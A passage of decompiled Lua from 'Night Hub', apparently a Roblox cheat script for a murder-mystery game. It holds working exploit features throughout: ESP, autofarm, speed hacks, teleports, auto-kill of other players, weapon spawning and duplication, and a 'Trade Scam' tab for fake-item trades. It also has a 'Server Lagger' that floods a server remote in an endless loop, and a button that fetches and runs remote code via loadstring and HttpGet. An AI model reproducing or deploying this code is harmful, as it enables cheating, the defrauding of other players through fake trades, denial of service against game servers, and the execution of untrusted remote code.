                    local v394 = Character and Character:FindFirstChild('HumanoidRootPart')

                    if v394 then
                        for _, v in ipairs(t14.ActiveGunDrops)do
                            local Magnitude = (v394.Position - v.Position).Magnitude

                            if Magnitude < n10 then
                                p26 = v
                                n10 = Magnitude
                            end
                        end
                    end
                end
                if p26 and LocalPlayer.Character then
                    local HumanoidRootPart = LocalPlayer.Character:FindFirstChild('HumanoidRootPart')

                    if HumanoidRootPart then
                        local HumanoidRootPartCFrame = HumanoidRootPart.CFrame

                        HumanoidRootPart.CFrame = p26.CFrame

                        task.wait(0.3)

                        local ProximityPrompt = p26:FindFirstChildOfClass('ProximityPrompt')

                        if ProximityPrompt then
                            fireproximityprompt(ProximityPrompt)
                            task.wait(0.15)

                            HumanoidRootPart.CFrame = HumanoidRootPartCFrame

                            v2:Notify({
                                Title = 'Gun System',
                                Content = 'Grabbed the gun & returned safely!',
                                Icon = 'check-circle',
                                Duration = 3,
                            })

                            return true
                        end

                        HumanoidRootPart.CFrame = HumanoidRootPartCFrame
                    end
                end

                return false
            end

            task.spawn(function()
                while true do
                    if t14.AutoGrabEnabled then
                        u108()

                        if #t14.ActiveGunDrops > 0 and LocalPlayer.Character then
                            local HumanoidRootPart = LocalPlayer.Character:FindFirstChild('HumanoidRootPart')

                            if HumanoidRootPart then
                                local v402
                                local n11 = (1/0)

                                for v406, v407 in ipairs(t14.ActiveGunDrops)do
                                    local Magnitude = (HumanoidRootPart.Position - v407.Position).Magnitude

                                    if Magnitude < n11 then
                                        v402 = v407
                                        n11 = Magnitude
                                    end
                                end

                                if v402 then
                                    local HumanoidRootPartCFrame = HumanoidRootPart.CFrame

                                    HumanoidRootPart.CFrame = v402.CFrame

                                    task.wait(0.3)

                                    local ProximityPrompt = v402:FindFirstChildOfClass('ProximityPrompt')

                                    if ProximityPrompt then
                                        fireproximityprompt(ProximityPrompt)
                                        task.wait(0.15)

                                        HumanoidRootPart.CFrame = HumanoidRootPartCFrame

                                        task.wait(1)
                                    else
                                        HumanoidRootPart.CFrame = HumanoidRootPartCFrame
                                    end
                                end
                            end
                        end
                    end

                    task.wait(t14.GunDropCheckInterval)
                end
            end)

            u110 = false
            n12 = 0.5

            local t15 = {
                'Sheriff',
                'Hero',
                'Innocent',
            }

            local function v113(p27)
                local v414 = ReplicatedStorage:FindFirstChild('GetPlayerData', true):InvokeServer()

                if v414 and v414[p27.Name] then
                    return v414[p27.Name].Role
                end

                return nil
            end

            function v114()
                local Character = LocalPlayer.Character

                if not Character then
                    return false
                end
                if Character:FindFirstChild('Knife') then
                    return true
                end

                local Knife = LocalPlayer.Backpack:FindFirstChild('Knife')

                if Knife then
                    Knife.Parent = Character

                    return true
                end

                return false
            end
            function v115()
                local t16 = {}

                ReplicatedStorage:FindFirstChild('GetPlayerData', true):InvokeServer()

                local v416 = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart')

                if not v416 then
                    return nil
                end

                for _, player in ipairs(Players:GetPlayers())do
                    if player ~= LocalPlayer and player.Character then
                        local v419 = v113(player)
                        local Humanoid = player.Character:FindFirstChild('Humanoid')
                        local HumanoidRootPart = player.Character:FindFirstChild('HumanoidRootPart')

                        if v419 then
                            v419 = Humanoid and (Humanoid.Health > 0 and (HumanoidRootPart and table.find(t15, v419)))
                        end
                        if v419 then
                            local insert = table.insert
                            local Magnitude = (v416.Position - HumanoidRootPart.Position).Magnitude

                            insert(t16, {
                                Player = player,
                                Distance = Magnitude,
                            })
                        end
                    end
                end

                table.sort(t16, function(p28, p29)
                    return p28.Distance < p29.Distance
                end)

                return t16[1] and t16[1].Player or nil
            end
            function v116(p30)
                if not p30 or not p30.Character then
                    return false
                end

                local Humanoid = p30.Character:FindFirstChild('Humanoid')

                if not Humanoid or Humanoid.Health <= 0 then
                    return false
                end
                if not v114() then
                    return false
                end

                local HumanoidRootPart = p30.Character:FindFirstChild('HumanoidRootPart')
                local HumanoidRootPart2 = LocalPlayer.Character:FindFirstChild('HumanoidRootPart')

                if HumanoidRootPart and HumanoidRootPart2 then
                    HumanoidRootPart2.CFrame = CFrame.new(HumanoidRootPart.Position + (HumanoidRootPart2.Position - HumanoidRootPart.Position).Unit * 2, HumanoidRootPart.Position)
                end

                local Knife = LocalPlayer.Character:FindFirstChild('Knife')

                if Knife and Knife:FindFirstChild('Stab') then
                    for _ = 1, 3 do
                        Knife.Stab:FireServer('Down')
                    end

                    return true
                end

                return false
            end
            function v117()
                u110 = false
            end

            v118 = v49:Section({
                Title = v30('Night Hub', t1.Pumpkin, t1.Purple),
                Icon = 'flame',
                Opened = true,
            })

            local v119 = v118:Tab({
                Title = 'ESP',
                Icon = 'eye',
            })
            local SemiBold = Enum.FontWeight.SemiBold

            v119:Section({
                Title = 'Player ESP Settings',
                TextSize = 18,
                FontWeight = SemiBold,
            })
            v119:Toggle({
                Flag = 'HighlightESP',
                Title = 'Highlight ESP',
                Desc = 'Enable player highlighting',
                Default = true,
                Callback = function(p31)
                    u68 = p31

                    if p31 then
                        t8 = {
                            'Esp All',
                        }
                    end

                    v88()
                end,
            })
            v119:Space()

            local t17 = {
                Title = 'Esp All',
                Icon = 'users',
            }
            local t18 = {
                Title = 'Esp Sheriff',
                Icon = 'shield',
            }
            local t19 = {
                Title = 'Esp Murder',
                Icon = 'knife',
            }
            local Dropdown = v119.Dropdown
            local t20 = {
                t17,
                t18,
                t19,
                {
                    Title = 'Esp Sheriff / Murder',
                    Icon = 'target',
                },
            }

            Dropdown(v119, {
                Flag = 'ESPOptions',
                Title = 'Filter ESP',
                Desc = 'Filter which players to highlight',
                Values = t20,
                Value = 'Esp All',
                Callback = function(p32)
                    t8 = {
                        p32.Title,
                    }

                    v88()
                end,
            })
            v119:Space()
            v119:Toggle({
                Flag = 'LineESP',
                Title = 'Line ESP (Tracers)',
                Desc = 'Draw lines to players',
                Default = false,
                Callback = function(p33)
                    u69 = p33

                    if not p33 then
                        for _, v in pairs(t9)do
                            v:Remove()
                        end
                    end

                    v88()
                end,
            })
        end

        local v126 = v118:Tab({
            Title = v30('Auto Farm', t1.Pumpkin, t1.DarkOrange),
            Icon = 'trending-up',
        })
        local FontWeight = Enum.FontWeight
        local Section = v126.Section
        local SemiBold = FontWeight.SemiBold

        Section(v126, {
            Title = 'Coin & Candy Collection',
            TextSize = 18,
            FontWeight = SemiBold,
        })
        v126:Toggle({
            Flag = 'CoinAutofarm',
            Title = 'Coin Autofarm',
            Desc = 'Automatically collect coins',
            Default = false,
            Callback = function(p34)
                u50 = p34

                if p34 then
                    t7 = {}

                    v2:Notify({
                        Title = 'Coin Autofarm',
                        Content = 'Farming started!',
                        Icon = 'dollar-sign',
                        Duration = 3,
                    })

                    return
                end

                v2:Notify({
                    Title = 'Coin Autofarm',
                    Content = 'Farming stopped',
                    Icon = 'x-circle',
                    Duration = 3,
                })
            end,
        })
        v126:Space()
        v126:Toggle({
            Flag = 'CandyAutofarm',
            Title = 'Candy Autofarm',
            Desc = 'Collect Halloween candy',
            Default = false,
            Callback = function(p35)
                u51 = p35

                if p35 then
                    t7 = {}

                    v2:Notify({
                        Title = 'Candy Autofarm',
                        Content = 'Farming started!',
                        Icon = 'candy',
                        Duration = 3,
                    })

                    return
                end

                v2:Notify({
                    Title = 'Candy Autofarm',
                    Content = 'Farming stopped',
                    Icon = 'x-circle',
                    Duration = 3,
                })
            end,
        })
        v126:Space()
        v126:Toggle({
            Flag = 'AutoEndRound',
            Title = 'Auto Reset Character',
            Desc = 'Automatically reset character when bag is full',
            Default = false,
            Callback = function(p36)
                u52 = p36
                u54 = p36

                if p36 then
                    local v438 = v2
                    local v439 = 'Will reset at ' .. n5

                    v438:Notify({
                        Title = 'Auto Reset',
                        Content = v439,
                        Icon = 'refresh-cw',
                        Duration = 3,
                    })

                    return
                end

                v2:Notify({
                    Title = 'Auto Reset',
                    Content = 'Disabled',
                    Icon = 'x-circle',
                    Duration = 3,
                })
            end,
        })
        v126:Space()
        v126:Toggle({
            Flag = 'AutoFlingMurderer',
            Title = 'Auto Fling Murderer',
            Desc = 'Automatically fling murderer when bag is full',
            Default = false,
            Callback = function(p37)
                u53 = p37

                if p37 then
                    local v441 = v2
                    local v442 = 'Will fling at ' .. n5

                    v441:Notify({
                        Title = 'Auto Fling',
                        Content = v442,
                        Icon = 'zap',
                        Duration = 3,
                    })

                    return
                end

                v2:Notify({
                    Title = 'Auto Fling',
                    Content = 'Disabled',
                    Icon = 'x-circle',
                    Duration = 3,
                })
            end,
        })
        v126:Space()

        local Slider = v126.Slider
        local t21 = {
            Min = 5,
            Max = 50,
            Default = 25,
        }

        Slider(v126, {
            Flag = 'FlySpeed',
            Title = 'Autofarm Speed',
            Desc = 'Adjust collection speed',
            Step = 1,
            Value = t21,
            Callback = function(p38)
                n2 = p38
            end,
        })
        v126:Space()

        local _Enum = Enum
        local Section2 = v126.Section
        local Medium = _Enum.FontWeight.Medium

        Section2(v126, {
            Title = '\u{26a0}\u{fe0f} Recommended: 25, higher will probably get you kicked',
            TextSize = 14,
            TextTransparency = 0.3,
            FontWeight = Medium,
        })
        v126:Space()
        v126:Button({
            Title = 'Reset Counter',
            Icon = 'refresh-cw',
            Justify = 'Center',
            Callback = function()
                t7 = {}

                v2:Notify({
                    Title = 'Counter Reset',
                    Content = 'Collection counter reset!',
                    Icon = 'check-circle',
                    Duration = 3,
                })
            end,
        })
        v126:Space()

        local Button = v126.Button
        local Blood = t1.Blood

        Button(v126, {
            Title = 'Fling Murderer',
            Icon = 'zap',
            Color = Blood,
            Justify = 'Center',
            Callback = function()
                v91()
            end,
        })
        v126:Space()

        local Sheriff = t1.Sheriff

        v126:Button({
            Title = 'Fling Sheriff',
            Icon = 'shield',
            Color = Sheriff,
            Justify = 'Center',
            Callback = function()
                v92()
            end,
        })

        local v138 = v118:Tab({
            Title = 'Character',
            Icon = 'user',
        })
        local _Enum2 = Enum
        local Section3 = v138.Section
        local SemiBold2 = _Enum2.FontWeight.SemiBold

        Section3(v138, {
            Title = 'Movement Settings',
            TextSize = 18,
            FontWeight = SemiBold2,
        })

        local Slider2 = v138.Slider
        local t22 = {
            Min = 0,
            Max = 200,
            Default = 16,
        }

        Slider2(v138, {
            Flag = 'WalkSpeed',
            Title = 'Walk Speed',
            Desc = 'Adjust walking speed',
            Step = 1,
            Value = t22,
            Callback = function(p39)
                t12.WalkSpeed.Value = p39

                v89()
            end,
        })
        v138:Space()
        v138:Toggle({
            Flag = 'BlockWalkSpeed',
            Title = 'Lock Walk Speed',
            Desc = 'Prevent changes',
            Default = false,
            Callback = function(p40)
                t12.WalkSpeed.Locked = p40
            end,
        })
        v138:Space()

        local Slider3 = v138.Slider
        local t23 = {
            Min = 0,
            Max = 200,
            Default = 50,
        }

        Slider3(v138, {
            Flag = 'JumpPower',
            Title = 'Jump Power',
            Desc = 'Adjust jump height',
            Step = 1,
            Value = t23,
            Callback = function(p41)
                t12.JumpPower.Value = p41

                v89()
            end,
        })
        v138:Space()
        v138:Toggle({
            Flag = 'BlockJumpPower',
            Title = 'Lock Jump Power',
            Desc = 'Prevent changes',
            Default = false,
            Callback = function(p42)
                t12.JumpPower.Locked = p42
            end,
        })
        v138:Space()

        local Button2 = v138.Button
        local Orange = t1.Orange

        Button2(v138, {
            Title = 'Reset to Default',
            Icon = 'rotate-ccw',
            Color = Orange,
            Justify = 'Center',
            Callback = function()
                t12.WalkSpeed.Value = 16
                t12.JumpPower.Value = 50

                v89()
            end,
        })
        v138:Space({Columns = 2})

        local SemiBold3 = Enum.FontWeight.SemiBold

        v138:Section({
            Title = 'Protection Settings',
            TextSize = 18,
            FontWeight = SemiBold3,
        })
        v138:Toggle({
            Flag = 'AntiFling',
            Title = 'Anti Fling (No Collide)',
            Desc = 'Bikin badan lu nembus player lain biar ga ke-fling',
            Default = false,
            Callback = function(p43)
                u60 = p43

                if p43 then
                    v2:Notify({
                        Title = 'Anti Fling',
                        Content = 'Aktif! Badan lu sekarang nembus player lain.',
                        Icon = 'shield-check',
                        Duration = 3,
                    })

                    return
                end

                v2:Notify({
                    Title = 'Anti Fling',
                    Content = 'Mati! Hati-hati ke-fling.',
                    Icon = 'shield-off',
                    Duration = 3,
                })
            end,
        })

        v149 = v118:Tab({
            Title = 'Teleport',
            Icon = 'move',
        })

        local SemiBold4 = Enum.FontWeight.SemiBold

        v149:Section({
            Title = 'Player Teleportation',
            TextSize = 18,
            FontWeight = SemiBold4,
        })

        u151 = nil

        local function v152()
            local t24 = {}

            for _, player in pairs(Players:GetPlayers())do
                if player ~= LocalPlayer then
                    table.insert(t24, {
                        Title = player.Name,
                        Icon = 'user',
                    })
                end
            end

            return t24
        end

        local v153 = v152()
        local v154 = v149:Dropdown({
            Flag = 'TeleportPlayer',
            Title = 'Select Player',
            Desc = 'Choose player',
            Values = v153,
            Callback = function(p44)
                u151 = Players:FindFirstChild(p44.Title)
            end,
        })

        v149:Space()

        local Purple = t1.Purple

        v149:Button({
            Title = 'Teleport to Player',
            Icon = 'zap',
            Color = Purple,
            Justify = 'Center',
            Callback = function()
                if u151 and u151.Character then
                    local HumanoidRootPart = u151.Character:FindFirstChild('HumanoidRootPart')
                    local HumanoidRootPart3 = LocalPlayer.Character:FindFirstChild('HumanoidRootPart')

                    if HumanoidRootPart and HumanoidRootPart3 then
                        HumanoidRootPart3.CFrame = HumanoidRootPart.CFrame

                        v2:Notify({
                            Title = 'Success',
                            Content = 'Teleported',
                            Icon = 'check-circle',
                            Duration = 3,
                        })

                        return
                    end
                else
                    v2:Notify({
                        Title = 'Error',
                        Content = 'Target not found',
                        Icon = 'x-circle',
                        Duration = 3,
                    })
                end
            end,
        })
        v149:Space()
        v149:Button({
            Title = 'Refresh Player List',
            Icon = 'refresh-cw',
            Justify = 'Center',
            Callback = function()
                local v455 = v154
                local t25 = {
                    v152(),
                }

                v455:Refresh(v1(t25))
            end,
        })
    end

    v149:Space({Columns = 2})

    local FontWeight = Enum.FontWeight
    local Section = v149.Section
    local SemiBold = FontWeight.SemiBold

    Section(v149, {
        Title = 'Role Teleportation',
        TextSize = 18,
        FontWeight = SemiBold,
    })

    local Blood = t1.Blood

    v149:Button({
        Title = 'Teleport to Murderer',
        Icon = 'knife',
        Color = Blood,
        Justify = 'Center',
        Callback = function()
            local v457 = v81()

            if v457 and v457.Character then
                local HumanoidRootPart = v457.Character:FindFirstChild('HumanoidRootPart')
                local HumanoidRootPart4 = LocalPlayer.Character:FindFirstChild('HumanoidRootPart')

                if HumanoidRootPart and HumanoidRootPart4 then
                    HumanoidRootPart4.CFrame = HumanoidRootPart.CFrame
                end
            end
        end,
    })
    v149:Space()

    local Toxic = t1.Toxic

    v149:Button({
        Title = 'Teleport to Sheriff',
        Icon = 'shield',
        Color = Toxic,
        Justify = 'Center',
        Callback = function()
            local v460 = v82()

            if v460 and v460.Character then
                local HumanoidRootPart = v460.Character:FindFirstChild('HumanoidRootPart')
                local HumanoidRootPart5 = LocalPlayer.Character:FindFirstChild('HumanoidRootPart')

                if HumanoidRootPart and HumanoidRootPart5 then
                    HumanoidRootPart5.CFrame = HumanoidRootPart.CFrame
                end
            end
        end,
    })

    local v161 = v118:Tab({
        Title = 'Weapon Spawner',
        Icon = 'sword',
    })
    local FontWeight2 = Enum.FontWeight
    local Section4 = v161.Section
    local SemiBold5 = FontWeight2.SemiBold

    Section4(v161, {
        Title = 'Spawn Weapons',
        TextSize = 18,
        FontWeight = SemiBold5,
    })

    s6 = ''

    v161:Input({
        Flag = 'WeaponName',
        Title = 'Weapon Name',
        Desc = 'Enter weapon name',
        Placeholder = 'e.g., CandyBlade',
        Callback = function(p45)
            s6 = p45
        end,
    })
    v161:Space()

    local Orange = t1.Orange

    v161:Button({
        Title = 'Spawn Weapon',
        Icon = 'sparkles',
        Color = Orange,
        Justify = 'Center',
        Callback = function()
            if s6 ~= '' then
                v105(s6)

                return
            end

            v2:Notify({
                Title = 'Error',
                Content = 'Enter name!',
                Icon = 'x-circle',
                Duration = 3,
            })
        end,
    })
    v161:Space({Columns = 2})

    local SemiBold6 = Enum.FontWeight.SemiBold

    v161:Section({
        Title = 'Quick Spawn Godlies',
        TextSize = 16,
        FontWeight = SemiBold6,
    })

    local Toxic2 = t1.Toxic

    v161:Button({
        Title = 'Spawn Raygun',
        Icon = 'zap',
        Color = Toxic2,
        Callback = function()
            v105('Raygun')
        end,
    })
    v161:Space()

    local Button = v161.Button
    local Blood2 = t1.Blood

    Button(v161, {
        Title = 'Spawn XenoKnife',
        Icon = 'knife',
        Color = Blood2,
        Callback = function()
            v105('XenoKnife')
        end,
    })
    v161:Space()

    local DarkPurple = t1.DarkPurple

    v161:Button({
        Title = 'Spawn XenoGun',
        Icon = 'crosshair',
        Color = DarkPurple,
        Callback = function()
            v105('XenoGun')
        end,
    })

    local v172 = v118:Tab({
        Title = 'Weapon Dupe',
        Icon = 'copy',
    })
    local _Enum = Enum
    local Section5 = v172.Section
    local SemiBold7 = _Enum.FontWeight.SemiBold

    Section5(v172, {
        Title = 'Single Weapon Duplication',
        TextSize = 18,
        FontWeight = SemiBold7,
    })
    v172:Input({
        Flag = 'DupeWeaponName',
        Title = 'Weapon Name',
        Desc = 'Weapon to dupe',
        Placeholder = 'e.g., Lightbringer',
        Callback = function(p46)
            s2 = p46
        end,
    })
    v172:Space()
    v172:Input({
        Flag = 'DupeAmount',
        Title = 'Dupe Amount',
        Desc = 'How many times',
        Placeholder = '5',
        Value = '1',
        Callback = function(p47)
            n6 = tonumber(p47) or 1
        end,
    })
    v172:Space()

    local DarkOrange = t1.DarkOrange

    v172:Button({
        Title = 'Start Duplication',
        Icon = 'layers',
        Color = DarkOrange,
        Justify = 'Center',
        Callback = function()
            if s2 == '' then
                v2:Notify({
                    Title = 'Error',
                    Content = 'Enter name',
                    Icon = 'x-circle',
                    Duration = 5,
                })

                return
            end

            for _ = 1, n6 do
                v100()
            end

            v2:Notify({
                Title = 'Complete',
                Content = 'Duplicated!',
                Icon = 'check-circle',
                Duration = 5,
            })
        end,
    })
    v172:Space({Columns = 3})

    local _Enum3 = Enum
    local Section6 = v172.Section
    local SemiBold8 = _Enum3.FontWeight.SemiBold

    Section6(v172, {
        Title = 'Inventory Duplication',
        TextSize = 18,
        FontWeight = SemiBold8,
    })

    local Button3 = v172.Button
    local Witch = t1.Witch

    Button3(v172, {
        Title = 'Dupe Entire Inventory',
        Icon = 'package',
        Color = Witch,
        Justify = 'Center',
        Callback = function()
            v101()
            v2:Notify({
                Title = 'Complete',
                Content = 'Duplicated inventory!',
                Icon = 'check-circle',
                Duration = 5,
            })
        end,
    })

    local v182 = v118:Tab({
        Title = 'Weapons Replacer',
        Icon = 'eye-off',
    })
    local FontWeight3 = Enum.FontWeight
    local Section7 = v182.Section
    local SemiBold9 = FontWeight3.SemiBold

    Section7(v182, {
        Title = 'Change Weapon Appearance',
        TextSize = 18,
        FontWeight = SemiBold9,
    })
    v182:Input({
        Flag = 'FromWeapon',
        Title = 'Weapon to Replace',
        Desc = 'Current weapon',
        Placeholder = 'e.g., Blossom',
        Callback = function(p48)
            s3 = p48
        end,
    })
    v182:Space()
    v182:Input({
        Flag = 'ToWeapon',
        Title = 'Weapon to Receive',
        Desc = 'Weapon appearance',
        Placeholder = 'e.g., Chroma',
        Callback = function(p49)
            s4 = p49
        end,
    })
    v182:Space()

    local Purple = t1.Purple

    v182:Button({
        Title = 'Change Visual',
        Icon = 'wand-2',
        Color = Purple,
        Justify = 'Center',
        Callback = function()
            if s3 == '' or s4 == '' then
                return
            end
            if pcall(function()
                local t26 = {}
                local Item = require(ReplicatedStorage.Database.Sync.Item)
                local t27 = {}

                for v536, v537 in pairs(Item)do
                    if v102(v536, s3) then
                        table.insert(t26, v536)
                    end
                    if v102(v536, s4) then
                        table.insert(t27, v536)
                    end
                end

                if #t26 > 0 and #t27 > 0 then
                    for _, v in ipairs(t26)do
                        for _, v4 in ipairs(t27)do
                            Item[v] = {}

                            for k, v5 in pairs(Item[v4])do
                                Item[v][k] = v5
                            end

                            ReplicatedStorage.Remotes.Inventory.Equip:FireServer(v4)
                        end
                    end

                    v2:Notify({
                        Title = 'Success',
                        Content = 'Weapon visual changed!',
                        Icon = 'check-circle',
                        Duration = 5,
                    })
                end
            end) then
            end
        end,
    })

    local v187 = v118:Tab({
        Title = 'Trade Scam',
        Icon = 'shield-alert',
    })
    local FontWeight4 = Enum.FontWeight
    local Section8 = v187.Section
    local SemiBold10 = FontWeight4.SemiBold

    Section8(v187, {
        Title = 'Visual Trade Protection',
        TextSize = 18,
        FontWeight = SemiBold10,
    })

    u191 = false

    v187:Toggle({
        Flag = 'VisualTrade',
        Title = 'Enable Visual Trade',
        Desc = 'Items are visual only',
        Default = false,
        Callback = function(p50)
            u191 = p50

            local v470 = v2

            if p50 then
                p50 = 'Enabled'
            end

            local v471 = p50 or 'Disabled'

            v470:Notify({
                Title = 'Visual Trade',
                Content = v471,
                Icon = 'shield-check',
                Duration = 3,
            })
        end,
    })
    v187:Space()

    local Blood3 = t1.Blood

    v187:Button({
        Title = 'Activate Visual Trade',
        Icon = 'alert-triangle',
        Color = Blood3,
        Justify = 'Center',
        Callback = function()
            if not u191 then
                v2:Notify({
                    Title = 'Error',
                    Content = 'Enable first',
                    Icon = 'x-circle',
                    Duration = 5,
                })

                return
            end

            v103()
        end,
    })

    v193 = v118:Tab({
        Title = 'Utilities',
        Icon = 'wrench',
    })

    local SemiBold11 = Enum.FontWeight.SemiBold

    v193:Section({
        Title = 'Server Utilities',
        TextSize = 18,
        FontWeight = SemiBold11,
    })
end

local Midnight = t1.Midnight

v193:Button({
    Title = 'Enable Anti-AFK',
    Icon = 'moon',
    Color = Midnight,
    Justify = 'Center',
    Callback = function()
        pcall(function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn'))()
        end)
        v2:Notify({
            Title = 'Anti-AFK',
            Content = 'Enabled!',
            Icon = 'check-circle',
            Duration = 3,
        })
    end,
})
v193:Space()

local Blood = t1.Blood

v193:Button({
    Title = 'Server Lagger',
    Icon = 'zap',
    Color = Blood,
    Justify = 'Center',
    Callback = function()
        pcall(function()
            local GetSyncData = ReplicatedStorage.GetSyncData
            local InvokeServer = GetSyncData.InvokeServer
            local n13 = 0

            while true do
                for _ = 1, 1 do
                    task.spawn(InvokeServer, GetSyncData)
                end

                n13 += 1

                if n13 == 3 then
                    wait(0)
                end
            end
        end)
    end,
})

local v197 = v118:Tab({
    Title = v30('Innocent', t1.Innocent, t1.Innocent),
    Icon = 'user-check',
})
local SemiBold = Enum.FontWeight.SemiBold

v197:Section({
    Title = 'Gun System',
    TextSize = 18,
    FontWeight = SemiBold,
})
v197:Toggle({
    Flag = 'AutoGrabGun',
    Title = 'Auto Grab Gun',
    Desc = 'Collect dropped gun',
    Default = false,
    Callback = function(p51)
        t14.AutoGrabEnabled = p51
    end,
})
v197:Space()

local Toxic = t1.Toxic

v197:Button({
    Title = 'Grab Gun Manually',
    Icon = 'hand',
    Color = Toxic,
    Justify = 'Center',
    Callback = function()
        v109()
    end,
})
v197:Space()
v197:Toggle({
    Flag = 'GrabGunGUIButton',
    Title = 'Grab Gun GUI Button',
    Desc = 'button lol',
    Default = false,
    Callback = function(p52)
        local v474 = CoreGui

        if p52 and not v474:FindFirstChild('GrabGunBtnGUI') then
            local ScreenGui = Instance.new('ScreenGui', v474)

            ScreenGui.Name = 'GrabGunBtnGUI'

            local TextButton = Instance.new('TextButton', ScreenGui)

            TextButton.Draggable = true
            TextButton.Size = UDim2.new(0, 60, 0, 60)
            TextButton.Position = UDim2.new(0.5, 90, 0.7, 0)
            TextButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
            TextButton.Text = 'Grab\nGun'
            TextButton.TextColor3 = t1.Toxic
            TextButton.TextSize = 14
            TextButton.Font = Enum.Font.GothamBold
            Instance.new('UICorner', TextButton).CornerRadius = UDim.new(1, 0)

            local UIStroke = Instance.new('UIStroke', TextButton)

            UIStroke.Color = t1.Toxic
            UIStroke.Thickness = 2

            TextButton.MouseButton1Click:Connect(function()
                v109()
            end)

            return
        end
        if not p52 and v474:FindFirstChild('GrabGunBtnGUI') then
            v474:FindFirstChild('GrabGunBtnGUI'):Destroy()
        end
    end,
})
v197:Space()
v197:Toggle({
    Flag = 'NotifyGunDrop',
    Title = 'Notify Gun Drop',
    Desc = 'Get notified when gun drops',
    Default = true,
    Callback = function(p53)
        t14.NotifyGunDrop = p53
    end,
})

local v200 = v118:Tab({
    Title = v30('Murder', t1.Blood, t1.Murder),
    Icon = 'skull',
})
local FontWeight = Enum.FontWeight
local Section = v200.Section
local SemiBold12 = FontWeight.SemiBold

Section(v200, {
    Title = 'Kill Functions',
    TextSize = 18,
    FontWeight = SemiBold12,
})
v200:Toggle({
    Flag = 'KillAll',
    Title = 'Kill All Players',
    Desc = 'Attack nearby targets',
    Default = false,
    Callback = function(p54)
        if p54 then
            if not u110 then
                u110 = true

                task.spawn(function()
                    while u110 do
                        local v548 = v115()

                        if not v548 then
                            u110 = false

                            return
                        end

                        v116(v548)
                        task.wait(n12)
                    end
                end)
            end

            v2:Notify({
                Title = 'Kill All',
                Content = 'Started',
                Icon = 'skull',
                Duration = 2,
            })

            return
        end

        v117()
    end,
})
v200:Space()

local t28 = {
    Min = 0.1,
    Max = 2,
    Default = 0.5,
}

v200:Slider({
    Flag = 'AttackDelay',
    Title = 'Attack Delay',
    Desc = 'Time between attacks',
    Step = 0.1,
    Value = t28,
    Callback = function(p55)
        n12 = p55
    end,
})
v200:Space()

local Button = v200.Button
local Blood4 = t1.Blood

Button(v200, {
    Title = 'Equip Knife',
    Icon = 'knife',
    Color = Blood4,
    Justify = 'Center',
    Callback = function()
        if v114() then
            v2:Notify({
                Title = 'Ready',
                Content = 'Knife equipped',
                Icon = 'check-circle',
                Duration = 2,
            })
        end
    end,
})

local v207 = v118:Tab({
    Title = v30('Sherrif', t1.Sheriff, t1.Sheriff),
    Icon = 'shield',
})
local FontWeight5 = Enum.FontWeight
local Section9 = v207.Section
local SemiBold13 = FontWeight5.SemiBold

Section9(v207, {
    Title = 'Shooting Functions',
    TextSize = 18,
    FontWeight = SemiBold13,
})
v207:Toggle({
    Flag = 'AimbotMurderGUI',
    Title = 'Shot Murder',
    Desc = 'its GUI lol',
    Default = false,
    Callback = function(p56)
        local v482 = CoreGui

        if p56 and not v482:FindFirstChild('GunW') then
            local ScreenGui = Instance.new('ScreenGui', v482)

            ScreenGui.Name = 'GunW'

            local TextButton = Instance.new('TextButton', ScreenGui)

            TextButton.Draggable = true
            TextButton.Size = UDim2.new(0, 160, 0, 60)
            TextButton.Position = UDim2.new(0.5, -80, 0.7, 0)
            TextButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
            TextButton.BorderColor3 = t1.Toxic
            TextButton.BorderSizePixel = 2
            TextButton.Text = 'Shoot Murder'
            TextButton.TextColor3 = t1.Toxic
            TextButton.TextSize = 20
            TextButton.Font = Enum.Font.GothamBold
            Instance.new('UICorner', TextButton).CornerRadius = UDim.new(0.2, 0)

            TextButton.MouseButton1Click:Connect(function()
                local v549 = v81()

                if v549 and (v549.Character and v549.Character:FindFirstChild('HumanoidRootPart')) then
                    local Character = LocalPlayer.Character
                    local v551 = Character and Character:FindFirstChild('HumanoidRootPart')
                    local HumanoidRootPart = v549.Character.HumanoidRootPart

                    if v551 then
                        local v553 = LocalPlayer:FindFirstChild('Backpack') and LocalPlayer.Backpack:FindFirstChild('Gun')

                        if not Character:FindFirstChild('Gun') and v553 then
                            v553.Parent = Character

                            task.wait(0.1)
                        end

                        local Gun = Character:FindFirstChild('Gun')

                        if Gun then
                            v551.CFrame = CFrame.lookAt(v551.Position, Vector3.new(HumanoidRootPart.Position.X, v551.Position.Y, HumanoidRootPart.Position.Z))

                            local t29 = {
                                Gun:FindFirstChild('Handle') and Gun.Handle.CFrame or v551.CFrame,
                                HumanoidRootPart.CFrame,
                            }
                            local Shoot = Gun:WaitForChild('Shoot')
                            local t30 = {
                                unpack(t29),
                            }

                            Shoot:FireServer(v1(t30))

                            return
                        end
                    end
                else
                    v2:Notify({
                        Title = 'Target Kosong',
                        Content = 'There is no stupid murder',
                        Icon = 'x-circle',
                        Duration = 2,
                    })
                end
            end)

            return
        end
        if not p56 and v482:FindFirstChild('GunW') then
            v482:FindFirstChild('GunW'):Destroy()
        end
    end,
})

local v211 = v118:Tab({
    Title = 'Settings',
    Icon = 'settings',
})
local SemiBold14 = Enum.FontWeight.SemiBold

v211:Section({
    Title = 'GUI Settings',
    TextSize = 18,
    FontWeight = SemiBold14,
})
v211:Keybind({
    Flag = 'GUIKeybind',
    Title = 'GUI Toggle Key',
    Desc = 'Press to open/close GUI',
    Value = 'G',
    Callback = function(p57)
        v49:SetToggleKey(Enum.KeyCode[p57])
    end,
})
v211:Space({Columns = 2})

local Section10 = v211.Section
local SemiBold15 = Enum.FontWeight.SemiBold

Section10(v211, {
    Title = 'Config Management',
    TextSize = 18,
    FontWeight = SemiBold15,
})

local s7 = 'default'
local ConfigManager = v49.ConfigManager
local v217 = s7
local v218 = v211:Input({
    Flag = 'ConfigName',
    Title = 'Config Name',
    Desc = 'Name',
    Icon = 'file',
    Value = v217,
    Callback = function(p58)
        s7 = p58
    end,
})

v211:Space()

local v219 = ConfigManager:AllConfigs()
local v220 = table.find(v219, s7) and s7 or nil

v211:Dropdown({
    Flag = 'ConfigSelect',
    Title = 'Load Config',
    Desc = 'Select config',
    Values = v219,
    Value = v220,
    Callback = function(p59)
        s7 = p59

        v218:Set(p59)
    end,
})
v211:Space()

local Toxic3 = t1.Toxic

v211:Button({
    Title = 'Save Config',
    Icon = 'save',
    Color = Toxic3,
